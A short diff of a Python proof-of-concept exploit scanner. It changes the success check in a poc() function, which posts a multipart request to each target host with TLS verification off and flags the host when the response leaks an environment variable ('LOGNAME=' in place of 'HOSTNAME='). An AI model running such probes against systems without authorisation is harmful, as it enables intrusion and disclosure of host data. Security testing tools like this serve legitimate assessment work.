@@ -69,7 +69,7 @@ def poc():
                    'Content-Type: text/plain; charset=utf-8\r\n\r\ntest\r\n--40a1f31a0ec74efaa46d53e9f4311353--\r\n'
             resp = requests.post(host, data, verify=False, headers=headers, timeout=(4, 20))
 
-            if resp.text.find('HOSTNAME=') >= 0:
+            if resp.text.find('LOGNAME=') >= 0:
                 lock.acquire()
                 _time = time.strftime('%H:%M:%S', time.localtime())
                 print_msg('[%s] %s' % (_time, host), True)
